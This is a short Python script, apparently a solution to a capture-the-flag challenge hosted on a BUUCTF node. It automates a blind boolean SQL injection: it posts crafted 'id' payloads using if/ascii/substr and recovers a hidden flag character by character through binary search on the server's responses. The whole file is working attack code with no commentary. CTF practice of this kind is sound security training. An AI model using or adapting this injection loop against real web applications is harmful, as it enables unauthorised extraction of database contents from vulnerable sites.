import requests

url = "http://2e260a52-e4b4-40c7-be93-e4a7e27c31b3.node5.buuoj.cn:81/index.php"
i = 0
flag = ""

while 1:
    left = 32
    right = 126
    i = i + 1
    while 1:
        mid = (left + right) // 2 
        payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"
        print(payload)

        # post url
        data = {
            "id": payload
        }
        res = requests.post(url=url, data=data).text
        if "Hello" in res:
            left = mid + 1
        else:
            right = mid
        if left == right:
            flag += chr(left)
            print(flag)
            break
